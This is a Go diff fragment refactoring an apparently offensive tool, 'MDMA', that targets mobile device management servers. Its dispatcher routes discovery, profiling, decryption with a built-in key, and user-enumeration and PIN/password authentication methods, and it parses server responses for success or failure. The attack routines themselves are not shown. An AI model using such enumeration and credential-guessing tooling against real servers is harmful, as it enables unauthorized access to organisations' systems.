+			"\x00\x1d\x00\x1b\x00\x00\x01\x90\x00": action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Submission Failure: %s", m.Cycle.API.Resp.Body[42:167]}},
 		}
 
-		check := string(m.cycle.api.Resp.Body[32:41])
+		check := string(m.Cycle.API.Resp.Body[32:41])
 		for key, val := range msg {
 			fmt.Printf("%v\n", val)
 			if strings.Contains(check, key) {
 				switch val.name {
 				case "info":
-					m.logr.Infof(val.pre, val.post[0].(string), val.post[1:]...)
+					m.Logr.Infof(val.pre, val.post[0].(string), val.post[1:]...)
 					return
 
 				case "fail":
-					m.logr.Failf(val.pre, val.post[0].(string), val.post[1:]...)
+					m.Logr.Failf(val.pre, val.post[0].(string), val.post[1:]...)
 					return
 
 				case "success":
-					m.logr.Successf(val.pre, val.post[0].(string), val.post[1:]...)
+					m.Logr.Successf(val.pre, val.post[0].(string), val.post[1:]...)
 					return
 				}
 			}
 		}
-		m.logr.Infof([]interface{}{m.opts.Endpoint, fmt.Sprintf("%x", m.cycle.api.Resp.Body[32:41])}, "Unknown Response: %x")
-
+		m.Logr.Infof([]interface{}{m.Opts.Endpoint, fmt.Sprintf("%x", m.Cycle.API.Resp.Body[32:41])}, "Unknown Response: %x")
 	}
 }
 
 // Call represents the switch function for activating all class methods
-func (m *mdma) Call() {
-	switch m.opts.Method {
-	case "disco":
-		if m.opts.Endpoint == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Domain required")
+func (m *MDMA) Call() {
+	switch m.Opts.Method {
+	case "Disco":
+		if m.Opts.Endpoint == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Domain required")
 			return
 		}
-		m.disco()
+		m.Disco()
 
-	case "prof":
-		if m.opts.Endpoint == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Endpoint required")
+	case "Prof":
+		if m.Opts.Endpoint == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Endpoint required")
 			return
 		}
-		m.prof()
+		m.Prof()
 
 	case "decrypt":
-		if m.opts.Endpoint == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "CipherTXT required")
+		if m.Opts.Endpoint == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "CipherTXT required")
 			return
 		}
-		b, _ := hex.DecodeString(m.opts.Endpoint)
-		m.logr.Successf(nil, "Decrypted Cipher: %s - %q", m.opts.Endpoint, decrypt(b, []byte(ironKey)))
+		b, _ := hex.DecodeString(m.Opts.Endpoint)
+		m.Logr.Successf(nil, "Decrypted Cipher: %s - %q", m.Opts.Endpoint, decrypt(b, []byte(ironKey)))
 
-	case "auth-user", "enum", "auth-pin", "auth-pinpass", "auth-pinuser":
-		m.auth()
+	case authUser, _enum, authPin, authPinPass, authPinUser:
+		m.Auth()
 
 	default:
-		m.logr.StdOut(Methods)
-		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
+		m.Logr.StdOut(Methods)
+		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
 	}
 }
